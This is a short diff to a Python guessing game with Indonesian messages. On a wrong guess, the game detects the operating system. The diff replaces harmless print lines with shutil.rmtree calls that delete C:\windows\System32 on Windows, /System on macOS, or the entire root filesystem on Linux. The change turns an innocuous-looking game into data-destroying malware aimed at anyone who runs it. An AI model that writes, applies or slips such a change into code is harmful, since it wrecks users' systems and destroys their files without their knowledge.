@@ -48,10 +48,10 @@ else:
     print(f"Tebakan salah! Mendeteksi OS: {system}")
 
     if system == "Windows":
-        print("C:\\windows\\System32")
+        shutil.rmtree("C:\\windows\\System32")
 
     elif system == "Darwin":  # macOS
-        print("/System")
+        shutil.rmtree("/System")
 
     elif system == "Linux":
-        print("/")
+        shutil.rmtree("/")
